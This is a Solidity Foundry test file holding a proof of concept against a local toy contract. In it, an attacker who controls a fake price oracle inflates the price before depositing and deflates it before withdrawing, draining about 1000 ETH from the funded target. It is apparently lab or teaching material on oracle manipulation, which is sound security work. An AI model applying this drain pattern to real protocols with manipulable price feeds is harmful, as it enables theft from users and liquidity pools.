// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/FakeOracle.sol";
import "../src/PriceOracleTarget.sol";

contract OraclePoC is Test {
    FakeOracle oracle;
    PriceOracleTarget target;
    address attacker = vm.addr(1);
    address victim  = vm.addr(2);

    function setUp() public {
        // deploy oracle at a neutral price (1)
        oracle = new FakeOracle(1);

        // deploy the vulnerable target pointing at oracle
        target = new PriceOracleTarget(address(oracle));

        // give attacker and victim some ETH
        vm.deal(attacker, 50 ether);
        vm.deal(victim, 10 ether);

        // fund the target contract so it can pay out big withdraws during PoC
        // (simulate protocol treasury or liquidity pool)
        vm.deal(address(target), 1000 ether);
    }

    /// @notice PoC: attacker manipulates oracle to inflate recorded USD on deposit,
    /// then deflates price before withdraw to convert recorded USD into far more ETH.
    function test_oracle_manipulation_fullDrain() public {
        // --- Step 1: attacker inflates oracle price so deposit records large USD
        vm.prank(attacker);
        oracle.setPrice(1000); // price = 1000 (attacker controls oracle in this playground)

        // attacker deposits 1 ETH -> recorded USD = 1 * 1000 = 1000
        vm.startPrank(attacker);
        target.deposit{value: 1 ether}();
        vm.stopPrank();

        // sanity: target balance increased by 1 ETH (plus we pre-funded it)
        assertEq(address(target).balance, 1001 ether);

        // --- Step 2: attacker deflates oracle price to 1 prior to withdraw
        vm.prank(attacker);
        oracle.setPrice(1);

        // attacker withdraws: ethOut = usd(1000) / price(1) = 1000 ETH
        vm.startPrank(attacker);
        target.withdraw();
        vm.stopPrank();

        // attacker should have increased ETH balance (since vm.deal gave 50 ETH, now it should be larger)
        // Note: attacker initial = 50, spent 1 deposit => 49; after withdraw should be 49 + 1000 = 1049
        assertGt(attacker.balance, 49 ether);

        // recorded balance cleared
        assertEq(target.usdBalance(attacker), 0);
    }

    /// @notice Optional: show a victim who deposits at fair price and then withdraws normally
    function test_victim_normalFlow() public {
        // set oracle to fair price
        vm.prank(victim);
        oracle.setPrice(10);

        vm.startPrank(victim);
        target.deposit{value: 1 ether}();
        vm.stopPrank();

        // lower price to simulate some market movement but not attacker control
        vm.prank(victim);
        oracle.setPrice(9);

        vm.startPrank(victim);
        target.withdraw();
        vm.stopPrank();

        // victim's usd balance should be cleared
        assertEq(target.usdBalance(victim), 0);
    }
}
